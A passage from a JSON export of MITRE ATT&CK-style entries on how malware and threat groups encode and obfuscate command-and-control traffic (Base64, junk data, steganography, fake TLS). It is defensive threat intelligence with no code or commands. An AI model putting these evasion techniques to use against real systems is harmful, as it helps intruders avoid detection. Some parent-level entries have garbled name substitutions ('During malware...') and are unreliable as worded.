                "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.[1][2] Some data encoding systems may also result in data compression, such as gzip.",
                "Procedure": {
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "C2 traffic from <name> is encrypted, then encoded with Base64 encoding.[3]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "An <name> HTTP malware variant used Base64 to encode communications to the C2 server.[4]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used base64 to encode command and control traffic.[5]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> encodes data using Base64 before sending it to the C2 server. [6]"
                    },
                    "S0129": {
                        "ID": "S0129",
                        "Name": "AutoIt backdoor",
                        "Description": "<name> has sent a C2 response that was base64-encoded.[7]"
                    },
                    "S0414": {
                        "ID": "S0414",
                        "Name": "BabyShark",
                        "Description": "<name> has encoded data using certutil before exfiltration.[8]"
                    },
                    "S0093": {
                        "ID": "S0093",
                        "Name": "Backdoor.Oldrea",
                        "Description": "Some <name> samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.[9]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> encodes C2 traffic with base64.[7][10][11]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has encoded binary data with Base64 and ASCII.[12][13]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has encoded its C2 traffic with Base64.[14]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "Several <name> tools encode data with base64 when posting it to a C2 server.[15]"
                    },
                    "S0014": {
                        "ID": "S0014",
                        "Name": "BS2005",
                        "Description": "<name> uses Base64 encoding for communication in the message body of an HTTP request.[16]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has the ability to base64 encode C2 server responses.[17]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> encodes the message body of HTTP traffic with Base64.[18][19]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used Base64 to encode C2 communications.[20]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "<name> can send additional modules over C2 encoded with base64.[21]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> can encode C2 data with a custom technique that utilizes Base64.[22][23]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use Base64, URL-safe Base64, or NetBIOS encoding in its C2 traffic.[24]"
                    },
                    "S0338": {
                        "ID": "S0338",
                        "Name": "Cobian RAT",
                        "Description": "<name> obfuscates communications with the C2 server using Base64 encoding.[25]"
                    },
                    "S0137": {
                        "ID": "S0137",
                        "Name": "CORESHELL",
                        "Description": "<name> C2 messages are Base64-encoded.[26]"
                    },
                    "S1024": {
                        "ID": "S1024",
                        "Name": "CreepySnail",
                        "Description": "<name> can use Base64 to encode its C2 traffic.[27]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> encodes data using hexadecimal representation before sending it to the C2 server.[28]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> uses custom base64 encoding to obfuscate HTTP traffic.[15]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> encodes the data sent to the server in Base64.[29]"
                    },
                    "S0200": {
                        "ID": "S0200",
                        "Name": "Dipsind",
                        "Description": "<name> encodes C2 traffic with base64.[30]"
                    },
                    "S1021": {
                        "ID": "S1021",
                        "Name": "DnsSystem",
                        "Description": "<name> can Base64 encode data sent to C2.[31]"
                    },
                    "S0472": {
                        "ID": "S0472",
                        "Name": "down_new",
                        "Description": "<name> has the ability to base64 encode C2 communications.[32]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has encoded C2 traffic in hexadecimal format.[33]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> exfiltrates data using cookie values that are Base64-encoded.[34]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has used Google\u2019s Protobufs to serialize data sent to and from the C2 server.[35]"
                    },
                    "S0171": {
                        "ID": "S0171",
                        "Name": "Felismus",
                        "Description": "Some <name> samples use a custom method for C2 traffic that utilizes Base64.[36]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> has encoded bidirectional data communications between a target system and C2 server using Base64.[37]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> can use Base64 to encode its C2 traffic.[38]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> has used Zlib to compress C2 communications data before encrypting it.[39]"
                    },
                    "S1117": {
                        "ID": "S1117",
                        "Name": "GLASSTOKEN",
                        "Description": "<name> has hexadecimal and Base64 encoded C2 content.[40]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can base64 encode C2 replies.[41]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used ASCII encoding for C2 traffic.[42]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "For C2 over HTTP, <name> encodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS, <name> converts ASCII characters into their hexadecimal values and sends the data in cleartext.[43]"
                    },
                    "S0376": {
                        "ID": "S0376",
                        "Name": "HOPLIGHT",
                        "Description": "<name> has utilized Zlib compression to obfuscate the communications payload. [44]"
                    },
                    "S0015": {
                        "ID": "S0015",
                        "Name": "Ixeshe",
                        "Description": "<name> uses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests.[45][46]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "A <name> variant encodes C2 POST data base64.[47]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> encodes communications to the C2 server in Base64.[48]"
                    },
                    "S0487": {
                        "ID": "S0487",
                        "Name": "Kessel",
                        "Description": "<name> has exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries.[49]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> can Base32 encode chunks of output files during exfiltration.[50]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has used a custom base64 key to encode stolen data before exfiltration.[51]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "A <name> malware sample encodes data with base64.[52]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has used base64 encoding.[53]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can encode data using Base64 prior to exfiltration.[54]"
                    },
                    "S0459": {
                        "ID": "S0459",
                        "Name": "MechaFlounder",
                        "Description": "<name> has the ability to use base16 encoded strings in C2.[55]"
                    },
                    "S0084": {
                        "ID": "S0084",
                        "Name": "Mis-Type",
                        "Description": "<name> uses Base64 encoding for C2 traffic.[56]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "<name> network traffic is Base64-encoded plaintext.[56]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> can use Base64 to encode information sent to its C2.[57]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> has used basE91 encoding, along with encryption, for C2 communication.[58]"
                    },
                    "S1047": {
                        "ID": "S1047",
                        "Name": "Mori",
                        "Description": "<name> can use Base64 encoded JSON libraries used in C2.[59]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used tools to encode C2 communications including Base64 encoding.[60][61]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> uses Base64 encoding for C2 traffic.[62]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has encoded C2 communications in Base64.[63]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> has used base64 to encode C2 communication.[64]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> encodes data in hexadecimal format over the C2 channel.[65]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> has used zlib to compress all data after 0x52 for the custom TCP C2 protocol.[66]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> used Base64 to encode C2 traffic.[67]"
                    },
                    "S1031": {
                        "ID": "S1031",
                        "Name": "PingPull",
                        "Description": "<name> can encode C2 traffic with Base64.[68]"
                    },
                    "S0124": {
                        "ID": "S0124",
                        "Name": "Pisloader",
                        "Description": "Responses from the <name> C2 server are base32-encoded.[69]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> has the ability to encode C2 communications with base64 encoding.[70][71]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> encoded C2 traffic with base64.[72]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> can use base64 encoded C2 communications.[73]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "<name> encodes C2 traffic with Base64.[74]"
                    },
                    "S1108": {
                        "ID": "S1108",
                        "Name": "PULSECHECK",
                        "Description": "<name> can base-64 encode encrypted data sent through C2.[75]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can Base64 encode system information sent to C2.[76][77]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> encodes C2 communications with base64.[78]"
                    },
                    "S1076": {
                        "ID": "S1076",
                        "Name": "QUIETCANARY",
                        "Description": "<name> can base64 encode C2 communications.[79]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has used base64 to encode its C2 traffic.[80]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> can communicate with the C2 via base32-encoded subdomains.[81]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> uses Base64 to encode information sent to the C2 server.[82]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> base64 encodes strings that are sent to the C2 over its DNS tunnel.[83]"
                    },
                    "S1078": {
                        "ID": "S1078",
                        "Name": "RotaJakiro",
                        "Description": "<name> uses ZLIB Compression to compresses data sent to the C2 server in the payload section network communication packet.[84]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> uses Base64 encoding for C2 traffic.[56]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has used Base64 to encode its C2 communications.[85]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> can base64 encode data sent in C2 communications prior to its encryption.[86]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name>'s BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.[87]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> can encode client ID data in 32 uppercase hex characters and transfer to the actor-controlled C2 server.[88]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> C2 traffic is base64-encoded.[89]"
                    },
                    "S0610": {
                        "ID": "S0610",
                        "Name": "SideTwist",
                        "Description": "<name> has used Base64 for encoded C2 traffic.[90]"
                    },
                    "S1110": {
                        "ID": "S1110",
                        "Name": "SLIGHTPULSE",
                        "Description": "<name> can base64 encode all incoming and outgoing C2 messages.[75]"
                    },
                    "S0633": {
                        "ID": "S0633",
                        "Name": "Sliver",
                        "Description": "<name> can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.[91]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has encoded its C2 traffic with Base64.[92]"
                    },
                    "S0543": {
                        "ID": "S0543",
                        "Name": "Spark",
                        "Description": "<name> has encoded communications with the C2 server with base64.[93]"
                    },
                    "S0374": {
                        "ID": "S0374",
                        "Name": "SpeakUp",
                        "Description": "<name> encodes C&C communication using Base64. [94]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has encoded its communications to C2 servers using Base64.[95]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> has the ability to hex-encode collected data from an infected host.[59]"
                    },
                    "S1112": {
                        "ID": "S1112",
                        "Name": "STEADYPULSE",
                        "Description": "<name> can transmit URL encoded data over C2.[75]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> transforms encrypted binary data into an ASCII string in order to use it as a URL parameter value.[96]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> used Base64 encoding in its C2 traffic.[97]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> has used Base64 to encode its C2 traffic.[98]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used encoded ASCII text for initial C2 communications.[99]"
                    },
                    "S0678": {
                        "ID": "S0678",
                        "Name": "Torisma",
                        "Description": "<name> has encoded C2 communications with Base64.[100]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> can Base64-encode C2 commands.[101]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has used base64 encoding to hide command strings delivered from the C2.[102]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has returned C2 data as encoded ASCII.[99]"
                    },
                    "S1116": {
                        "ID": "S1116",
                        "Name": "WARPWIRE",
                        "Description": "<name> can Base64 encode captured credentials with btoa() prior to sending to C2.[103]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> has used Base64 encoding to uniquely identify communication to and from the C2.[104]"
                    },
                    "S1115": {
                        "ID": "S1115",
                        "Name": "WIREFIRE",
                        "Description": "<name> can Base64 encode process output sent to C2.[103]"
                    },
                    "S0653": {
                        "ID": "S0653",
                        "Name": "xCaon",
                        "Description": "<name> has used Base64 to encode its C2 traffic.[105]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> has used URL/Percent Encoding on data exfiltrated via HTTP POST requests.[106]"
                    }
                }
            },
            "002": {
                "name": "Non-Standard Encoding",
                "href": "/techniques/T1132/002",
                "description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.[1] [2]",
                "Procedure": {
                    "S0031": {
                        "ID": "S0031",
                        "Name": "BACKSPACE",
                        "Description": "Newer variants of <name> will encode C2 communications with a custom system.[3]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> encodes commands from the control server using a range of characters and gzip.[4]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> can use a custom binary scheme to encode messages with specific commands and parameters to be executed.[5]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can use a modified base32 encoding to encode data within the subdomain of C2 requests.[6]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> has used a non-standard encoding in DNS tunneling removing any = from the result of base64 encoding, and replacing / characters with -s and + characters with -p.[7]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> can encode C2 communications with a base64 algorithm using a custom alphabet.[8]"
                    },
                    "S0346": {
                        "ID": "S0346",
                        "Name": "OceanSalt",
                        "Description": "<name> can encode data with a NOT operation before sending the data to the control server.[9]"
                    },
                    "S1046": {
                        "ID": "S1046",
                        "Name": "PowGoop",
                        "Description": "<name> can use a modified Base64 encoding mechanism to send data to and from the C2 server.[10]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> can communicate with the C2 via subdomains that utilize base64 with character substitutions.[11]"
                    },
                    "S0596": {
                        "ID": "S0596",
                        "Name": "ShadowPad",
                        "Description": "<name> has encoded data as readable Latin characters.[12]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> can use a custom hex byte swapping encoding scheme to obfuscate tasking traffic.[13][14]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use a custom base62 and a de-facto base32 encoding that uses digits 0-9 and lowercase letters a-z in C2 communications.[15]"
                    }
                }
            }
        },
        "tactic": "Command and Control",
        "description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.[1] [2] Some data encoding systems may also result in data compression, such as gzip.",
        "Procedure": {
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "After encrypting C2 data, malware converts it into a hexadecimal representation and then encodes it into base64.[3]"
            },
            "S0132": {
                "ID": "S0132",
                "Name": "H1N1",
                "Description": "malware obfuscates C2 traffic with an altered version of base64.[4]"
            },
            "S0362": {
                "ID": "S0362",
                "Name": "Linux Rabbit",
                "Description": "malware sends the payload from the C2 server as an encoded URL parameter. [5]"
            },
            "S0699": {
                "ID": "S0699",
                "Name": "Mythic",
                "Description": "malware provides various transform functions to encode and/or randomize C2 data.[6]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used encoded data in HTTP URLs for C2.[7]"
            }
        }
    },
    "T1001": {
        "ttp_name": "Data Obfuscation",
        "ttp_id": "T1001",
        "href": "/techniques/T1001",
        "subtechnique": {
            "001": {
                "name": "Junk Data",
                "href": "/techniques/T1001/001",
                "description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult.[1] By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.[2]"
                    },
                    "S0574": {
                        "ID": "S0574",
                        "Name": "BendyBear",
                        "Description": "<name> has used byte randomization to obscure its behavior.[3]"
                    },
                    "S0134": {
                        "ID": "S0134",
                        "Name": "Downdelph",
                        "Description": "<name> inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.[4]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has used decoy traffic to surround its malicious network traffic to avoid detection.[5]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name>  can pad C2 messages with random generated values.[6]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> can generate a sequence of dummy HTTP C2 requests to obscure traffic.[7]"
                    },
                    "S1047": {
                        "ID": "S1047",
                        "Name": "Mori",
                        "Description": "<name> has obfuscated the FML.dll with 200MB of junk data.[8]"
                    },
                    "S0016": {
                        "ID": "S0016",
                        "Name": "P2P ZeuS",
                        "Description": "<name> added junk data to outgoing UDP packets to peer implants.[9]"
                    },
                    "S0626": {
                        "ID": "S0626",
                        "Name": "P8RAT",
                        "Description": "<name> can send randomly-generated data as part of its C2 communication.[10]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> samples were found to be highly obfuscated with junk code.[11][12]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> added junk bytes to its C2 over HTTP.[1]"
                    },
                    "S0682": {
                        "ID": "S0682",
                        "Name": "TrailBlazer",
                        "Description": "<name> has used random identifier strings to obscure its C2 operations and result codes.[13]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> can insert pseudo-random characters into its network encryption setup.[14]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can add extra characters in encoded strings to help mimic DNS legitimate requests.[15]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> can use junk data in the Base64 string for additional obfuscation.[16]"
                    }
                }
            },
            "002": {
                "name": "Steganography",
                "href": "/techniques/T1001/002",
                "description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
                "Procedure": {
                    "G0001": {
                        "ID": "G0001",
                        "Name": "Axiom",
                        "Description": "<name> has used steganography to hide its C2 communications.[1]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> can use steganography to hide malicious code downloaded to the victim.[2]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "When the <name> command and control is operating over HTTP or HTTPS, <name> uploads data to its controller by appending it to a blank JPG file.[3]"
                    },
                    "S0037": {
                        "ID": "S0037",
                        "Name": "HAMMERTOSS",
                        "Description": "<name> is controlled via commands that are appended to image files.[4]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> is controlled via commands that are embedded into PDFs and JPGs using steganographic methods.[5]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "During <name>, APT29 used steganography to hide the communications between the implants and their C&C servers.[6]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> can process steganographic images attached to email messages to send and receive C2 commands. <name> can also embed additional messages within BMP images to communicate with the <name> operator.[7]"
                    },
                    "S0633": {
                        "ID": "S0633",
                        "Name": "Sliver",
                        "Description": "<name> can encode binary data into a .PNG file for C2 communication.[8]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> C2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob.[9][10][11]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "<name> has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.[12][13]"
                    },
                    "S0672": {
                        "ID": "S0672",
                        "Name": "Zox",
                        "Description": "<name> has used the .PNG file format for C2 communications.[1]"
                    }
                }
            },
            "003": {
                "name": "Protocol Impersonation",
                "href": "/techniques/T1001/003",
                "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",
                "Procedure": {
                    "S0245": {
                        "ID": "S0245",
                        "Name": "BADCALL",
                        "Description": "<name> uses a FakeTLS method during C2.[1]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> generates a false TLS handshake using a public certificate to disguise C2 network communications.[2]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.[3]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can mimic the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI.[4]"
                    },
                    "S0076": {
                        "ID": "S0076",
                        "Name": "FakeM",
                        "Description": "<name> C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Additionally, some variants of <name> use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.[5]"
                    },
                    "S0181": {
                        "ID": "S0181",
                        "Name": "FALLCHILL",
                        "Description": "<name> uses fake Transport Layer Security (TLS) to communicate with its C2 server.[6]"
                    },
                    "S1120": {
                        "ID": "S1120",
                        "Name": "FRAMESTING",
                        "Description": "<name> uses a cookie named DSID to mimic the name of a cookie used by Ivanti Connect Secure appliances for maintaining VPN sessions.[7]"
                    },
                    "S0246": {
                        "ID": "S0246",
                        "Name": "HARDRAIN",
                        "Description": "<name> uses FakeTLS to communicate with its C2 server.[8]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used a FakeTLS session for C2 communications.[9]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can mimic HTTP protocol with custom HTTP \"verbs\" HIDE, ZVVP, and NOP.[10][11]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> uses custom SSL libraries to impersonate SSL in C2 traffic.[12]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption.[13][14][15][16]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> has the ability to mimic legitimate services with customized HTTP URL paths and headers to hide malicious traffic.[17]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> mimics HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.[18]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> masqueraded its network traffic as the Orion Improvement Program (OIP) protocol.[19]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
                        "Description": "<name> has used FakeTLS for session authentication.[20]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use custom communication methodologies that ride over common  protocols including TCP, UDP, HTTP, SMTP, and DNS in order to blend with normal network traffic. [21]"
                    }
                }
            }
        },
        "tactic": "Command and Control",
        "description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect.[1] Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",
        "Procedure": {
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware will retrieved encrypted commands from its command and control server for follow-on actions such as cryptocurrency mining.[2]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware may obfuscate portions of the initial C2 handshake.[3]"
            },
            "S1120": {
                "ID": "S1120",
                "Name": "FRAMESTING",
                "Description": "malware can send and receive zlib compressed data within POST requests.[4]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can send compressed and obfuscated packets to C2.[1]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware has the ability to modify headers and URL paths to hide malicious traffic in HTTP requests.[5]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors encrypted IP addresses used for \"Agent\" proxy hops with RC4.[6]"
            },
            "S0495": {
                "ID": "S0495",
                "Name": "RDAT",
                "Description": "malware has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2.[7]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware can embed C2 responses in the source code of a fake Flickr webpage.[8]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has hashed a string containing system information prior to exfiltration via POST requests.[9]"
            },
            "S0682": {
                "ID": "S0682",
